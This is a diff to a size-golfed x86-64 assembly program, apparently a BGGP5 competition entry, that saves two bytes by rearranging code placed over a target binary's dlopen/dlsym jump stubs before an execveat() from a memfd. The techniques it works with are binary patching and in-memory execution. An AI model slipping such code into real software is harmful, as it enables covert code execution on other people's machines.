@@ -8,7 +8,7 @@
 ; |                         |_|               (_____|                         |
 ; |                                                                           |
 ; +---------------------------------------------------------------------------+
-; |                   bah / July 2024 / #BGGP5 / 622 bytes                    |
+; |                   bah / July 2024 / #BGGP5 / 620 bytes                    |
 ; +---------------------------------------------------------------------------+
 ; |                     nasm -f bin bphage.asm -o bphage                      |
 ; +---------------------------------------------------------------------------+
@@ -437,10 +437,9 @@ _execve_memfd:
         %assign AT_EMPTY_PATH 0x1000
         mov     r8w, AT_EMPTY_PATH
         ; r10 was never used and is 0
-        regcopy rsi, rbx
         ; rdi is the same as write()
         mov     eax, SYS_execveat
-        jmp     _finish_exec
+        jmp     _step_1
 
 ; we will now be in the patch after the execveat(), so lets move onto that!
 ; We slightly overly code as we have some extra bytes avaliable in the jump
@@ -452,21 +451,19 @@ _dlopen:
         ; These are the opcodes for a relative jmp
         db      0xff, 0x25
 _dlopen_target:
+_step_1:
         ; We'll be overwriting the destination when we copy this into the target
         ; binary, so we can actually use them for stuff while we are trying to
         ; set that up.
-        db      "abcd"
+        ; doing a 2 byte regcpy, then jumping to finish the execveat().
+        regcopy rsi, rbx    ; db 0x53, 0x5e
+        jmp     _step_2     ; 2 bytes
 _dlopen_end:
 
 _dlsym:
         db      0xff, 0x25
 _dlsym_target:
-_finish_exec:
-        ; We have 4 bytes here that are free, so we'll use the space to save 2
-        ; bytes.
-        ; Sadly, I couldn't find a use for the "abcd" just above this as I
-        ; couldn't find a 2 byte instruction to fill the space, or find a way
-        ; to use the `and` 0x25 gives use (requires a 4 byte opperand)
+_step_2:
         xor     edx, edx    ; db 0x31, 0xd2
         syscall             ; db 0x0f, 0x05
 _dlsym_end:
